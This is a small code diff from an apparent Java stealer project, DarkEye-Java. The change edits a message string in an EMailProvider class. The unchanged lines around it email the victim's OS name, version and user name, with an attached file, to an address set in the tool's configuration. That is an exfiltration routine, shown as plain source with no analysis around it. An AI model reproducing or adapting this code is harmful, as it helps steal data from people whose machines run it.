@@ -43,7 +43,7 @@ public class EMailProvider {
 			email.setAuthentication(data.getEmail(), data.getPassword());
 			email.setSubject("[DARKEYE] " + System.getProperty("os.name") + System.getProperty("os.version") + " | "
 					+ System.getProperty("user.name"));
-			email.setMsg("[DarkEye-Java" + DarkEye.BUILD + "]: " + "https://github.com/SprayDown/DarkEye-Java");
+			email.setMsg("[DarkEye-Java]: " + "https://github.com/SprayDown/DarkEye-Java");
 			email.setSSLOnConnect(data.getMethod().isSSL());
 			email.attach(attachment);
 			email.send();
